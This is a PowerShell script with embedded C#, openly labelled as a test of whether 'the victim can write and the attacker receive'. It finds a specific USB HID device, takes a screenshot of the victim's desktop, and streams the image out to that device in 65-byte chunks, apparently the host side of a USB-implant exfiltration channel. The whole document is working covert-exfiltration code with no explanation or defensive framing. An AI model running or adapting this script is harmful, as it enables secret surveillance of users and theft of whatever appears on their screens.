#-A simple test to see if the victim can write and the attacker receive

# Open file handle to device
$cs =@"
using System;
using System.IO;
using Microsoft.Win32.SafeHandles;
using System.Runtime.InteropServices;
namespace foo {
	public class bar {
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern SafeFileHandle CreateFile(String fn, UInt32 da, Int32 sm, IntPtr sa, Int32 cd, uint fa, IntPtr tf);

		public static FileStream open(string fn) {
			return new FileStream(CreateFile(fn, 0XC0000000U, 3, IntPtr.Zero, 3, 0x40000000, IntPtr.Zero), FileAccess.ReadWrite, 9, true);
		}
	}
}
"@
Add-Type -TypeDefinition $cs | Out-Null
#Find device
$devs = gwmi Win32_USBControllerDevice
foreach ($dev in $devs) {
	$wmidev = [wmi]$dev.Dependent
	if ($wmidev.GetPropertyValue('DeviceID') -match ('03EB&PID_2066') -and ($wmidev.GetPropertyValue('Service') -eq $null)) {
		$devicestring = ([char]92+[char]92+'?'+[char]92 + $wmidev.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35) + [char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')
	}
}
$filehandle = [foo.bar]::open($devicestring)

#Create screenshot
[Reflection.Assembly]::LoadWithPartialName("System.Drawing")
$screen = (Get-WmiObject -Class Win32_DesktopMonitor | Select-Object ScreenWidth,ScreenHeight)
$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, $screen.ScreenWidth, $screen.ScreenHeight)
$bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
$graphics = [Drawing.Graphics]::FromImage($bmp)
$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
$qualityEncoder = [System.Drawing.Imaging.Encoder]::Quality
$encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
$encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter($qualityEncoder, 10)
$jpegCodecInfo = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | where {$_.MimeType -eq 'image/jpeg'}
$pic = New-Object System.IO.MemoryStream
$bmp.Save($pic,$jpegCodecInfo,$encoderParams)

#Write it
$pic.Seek(0, [System.IO.SeekOrigin]::Begin)
$picbytes = New-Object Byte[] (65)
$inbytes = New-Object Byte[] (65)
$nullbytes = New-Object Byte[] (65)

while ($pic.Position -lt $pic.Length) {
  $null = $filehandle.Write($nullbytes, 0, 65)
	$null = $filehandle.Read($inbytes, 0, 65)
	if ($inbytes[1] -band 128) {
		Write-Output .
	} else {
		$picbytes[1] = $pic.Read($picbytes, 2, 63)
		$null = $filehandle.Write($picbytes, 0, 65)
	}
	[System.Console]::WriteLine([String]::Format("{0} of {1}", $pic.Position, $pic.Length))
}
$filehandle.Close()
